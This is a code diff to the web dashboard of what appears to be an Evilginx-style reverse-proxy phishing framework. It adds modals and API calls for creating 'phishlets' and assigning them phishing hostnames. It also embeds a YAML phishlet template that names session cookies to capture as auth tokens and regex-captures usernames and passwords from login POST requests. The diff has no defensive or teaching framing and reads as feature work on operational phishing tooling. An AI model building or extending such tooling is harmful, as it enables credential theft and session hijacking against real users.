@@ -797,6 +797,9 @@ body.dark .terminal-wrap {
 <div id="section-phishlets" class="section-page">
     <div class="section-table-wrap">
       <h2><i class="ri-shield-keyhole-line"></i> Phishlets</h2>
+      <div style="margin-bottom:16px;">
+        <button class="btn-create" onclick="openCreatePhishletModal()"><i class="ri-add-line"></i> Create Phishlet</button>
+      </div>
       <table class="section-table" id="phishletsTable">
         <thead>
           <tr>
@@ -811,6 +814,38 @@ body.dark .terminal-wrap {
         </tbody>
       </table>
     </div>
+</div>
+
+<!-- ==================== CREATE PHISHLET MODAL ==================== -->
+<div id="modalCreatePhishlet" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:1000;align-items:center;justify-content:center;">
+  <div style="background:#1e1e2e;border-radius:10px;padding:28px 32px;width:720px;max-width:96vw;max-height:90vh;overflow-y:auto;box-shadow:0 8px 40px rgba(0,0,0,0.5);">
+    <h3 style="margin:0 0 20px;color:#e0e0f0;font-size:17px;"><i class="ri-add-circle-line"></i> Create Phishlet</h3>
+    <label style="display:block;margin-bottom:6px;color:#aaa;font-size:13px;">Name <span style="color:#f66;">*</span></label>
+    <input id="newPhishletName" type="text" placeholder="e.g. github" maxlength="63"
+      style="width:100%;box-sizing:border-box;padding:8px 12px;border-radius:6px;border:1px solid #444;background:#12121c;color:#e0e0f0;font-size:13px;margin-bottom:16px;">
+    <label style="display:block;margin-bottom:6px;color:#aaa;font-size:13px;">YAML content <span style="color:#f66;">*</span></label>
+    <textarea id="newPhishletYAML" rows="22" spellcheck="false"
+      style="width:100%;box-sizing:border-box;padding:10px 12px;border-radius:6px;border:1px solid #444;background:#12121c;color:#e0e0f0;font-size:12px;font-family:monospace;resize:vertical;margin-bottom:20px;"></textarea>
+    <div style="display:flex;gap:10px;justify-content:flex-end;">
+      <button onclick="closeCreatePhishletModal()" style="padding:8px 18px;border-radius:6px;border:1px solid #555;background:transparent;color:#aaa;cursor:pointer;font-size:13px;">Cancel</button>
+      <button onclick="submitCreatePhishlet()" class="btn-create" style="padding:8px 22px;font-size:13px;"><i class="ri-save-line"></i> Save</button>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== SET HOSTNAME MODAL ==================== -->
+<div id="modalSetHostname" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:1000;align-items:center;justify-content:center;">
+  <div style="background:#1e1e2e;border-radius:10px;padding:28px 32px;width:440px;max-width:96vw;box-shadow:0 8px 40px rgba(0,0,0,0.5);">
+    <h3 style="margin:0 0 6px;color:#e0e0f0;font-size:17px;"><i class="ri-global-line"></i> Set Hostname</h3>
+    <p id="setHostnameSubtitle" style="margin:0 0 18px;color:#888;font-size:13px;"></p>
+    <label style="display:block;margin-bottom:6px;color:#aaa;font-size:13px;">Hostname <span style="color:#f66;">*</span></label>
+    <input id="setHostnameValue" type="text" placeholder="e.g. login.yourdomain.com"
+      style="width:100%;box-sizing:border-box;padding:8px 12px;border-radius:6px;border:1px solid #444;background:#12121c;color:#e0e0f0;font-size:13px;margin-bottom:20px;">
+    <div style="display:flex;gap:10px;justify-content:flex-end;">
+      <button onclick="closeSetHostnameModal()" style="padding:8px 18px;border-radius:6px;border:1px solid #555;background:transparent;color:#aaa;cursor:pointer;font-size:13px;">Cancel</button>
+      <button onclick="submitSetHostname()" class="btn-create" style="padding:8px 22px;font-size:13px;"><i class="ri-save-line"></i> Save</button>
+    </div>
+  </div>
 </div>
 
 <!-- ==================== LURES SECTION ==================== -->
@@ -1668,12 +1703,16 @@ function loadPhishlets() {
       if (p.hidden) { displayStatus = 'hidden'; badgeClass = 'badge-hidden'; }
       else if (p.enabled) { displayStatus = 'enabled'; badgeClass = 'badge-enabled'; }
 
+      var hostnameDisplay = p.hostname
+        ? escapeHtml(p.hostname)
+        : '<span style="color:#f90;font-size:11px;">⚠ not set</span>';
       var tr = document.createElement('tr');
       tr.innerHTML =
         '<td>' + escapeHtml(p.name || '') + '</td>' +
-        '<td>' + escapeHtml(p.hostname || '-') + '</td>' +
+        '<td>' + hostnameDisplay + '</td>' +
         '<td><span class="badge ' + badgeClass + '">' + displayStatus + '</span></td>' +
         '<td>' +
+          '<button onclick="openSetHostnameModal(\'' + escapeHtml(p.name) + '\', \'' + escapeHtml(p.hostname || '') + '\')">Set Hostname</button>' +
           '<button onclick="togglePhishlet(\'' + escapeHtml(p.name) + '\', \'enable\')">Enable</button>' +
           '<button class="btn-warn" onclick="togglePhishlet(\'' + escapeHtml(p.name) + '\', \'disable\')">Disable</button>' +
           '<button onclick="togglePhishlet(\'' + escapeHtml(p.name) + '\', \'hide\')">Hide</button>' +
@@ -1713,6 +1752,124 @@ function togglePhishlet(name, action) {
     showNotify('Failed to ' + action + ' phishlet.', 'error');
   });
 }
+
+var _setHostnameTarget = '';
+
+function openSetHostnameModal(name, currentHostname) {
+  _setHostnameTarget = name;
+  document.getElementById('setHostnameSubtitle').textContent = 'Phishlet: ' + name;
+  document.getElementById('setHostnameValue').value = currentHostname || '';
+  var modal = document.getElementById('modalSetHostname');
+  modal.style.display = 'flex';
+  setTimeout(function() { document.getElementById('setHostnameValue').focus(); }, 50);
+}
+
+function closeSetHostnameModal() {
+  document.getElementById('modalSetHostname').style.display = 'none';
+  _setHostnameTarget = '';
+}
+
+function submitSetHostname() {
+  var hostname = document.getElementById('setHostnameValue').value.trim();
+  if (!hostname) { showNotify('Hostname is required.', 'error'); return; }
+  apiFetch('/api/phishlets/hostname', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ name: _setHostnameTarget, hostname: hostname })
+  }).then(function(r) {
+    if (!r) return;
+    return r.json().then(function(body) {
+      if (r.ok) {
+        showNotify('Hostname for "' + _setHostnameTarget + '" set to ' + hostname, 'success');
+        closeSetHostnameModal();
+        loadPhishlets();
+      } else {
+        showNotify(body.error || 'Failed to set hostname.', 'error');
+      }
+    });
+  }).catch(function() {
+    showNotify('Failed to set hostname.', 'error');
+  });
+}
+
+document.getElementById('modalSetHostname').addEventListener('click', function(e) {
+  if (e.target === this) closeSetHostnameModal();
+});
+
+// Allow Enter key to submit the hostname modal
+document.getElementById('setHostnameValue').addEventListener('keydown', function(e) {
+  if (e.key === 'Enter') submitSetHostname();
+});
+
+var PHISHLET_TEMPLATE = [
+  "min_ver: '3.0.0'",
+  "author: ''",
+  "",
+  "proxy_hosts:",
+  "  - {phish_sub: 'www', orig_sub: 'www', domain: 'example.com', session: true, is_landing: true, auto_filter: true}",
+  "",
+  "sub_filters: []",
+  "",
+  "auth_tokens:",
+  "  - domain: '.example.com'",
+  "    keys: ['session']",
+  "",
+  "credentials:",
+  "  username:",
+  "    key: 'login'",
+  "    search: '(.+)'",
+  "    type: post",
+  "  password:",
+  "    key: 'passwd'",
+  "    search: '(.+)'",
+  "    type: post",
+  "",
+  "login:",
+  "  domain: 'www.example.com'",
+  "  path: '/login'",
+].join('\n');
+
+function openCreatePhishletModal() {
+  document.getElementById('newPhishletName').value = '';
+  document.getElementById('newPhishletYAML').value = PHISHLET_TEMPLATE;
+  var modal = document.getElementById('modalCreatePhishlet');
+  modal.style.display = 'flex';
+}
+
+function closeCreatePhishletModal() {
+  document.getElementById('modalCreatePhishlet').style.display = 'none';
+}
+
+function submitCreatePhishlet() {
+  var name = document.getElementById('newPhishletName').value.trim();
+  var yaml = document.getElementById('newPhishletYAML').value.trim();
+  if (!name) { showNotify('Phishlet name is required.', 'error'); return; }
+  if (!yaml)  { showNotify('YAML content is required.', 'error'); return; }
+
+  apiFetch('/api/phishlets/create', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ name: name, yaml: yaml })
+  }).then(function(r) {
+    if (!r) return;
+    return r.json().then(function(body) {
+      if (r.ok) {
+        showNotify('Phishlet "' + name + '" created.', 'success');
+        closeCreatePhishletModal();
+        loadPhishlets();
+      } else {
+        showNotify(body.error || 'Failed to create phishlet.', 'error');
+      }
+    });
+  }).catch(function() {
+    showNotify('Failed to create phishlet.', 'error');
+  });
+}
+
+// Close modal when clicking the backdrop
+document.getElementById('modalCreatePhishlet').addEventListener('click', function(e) {
+  if (e.target === this) closeCreatePhishletModal();
+});
 
 // ============================================================
 // Lures Section
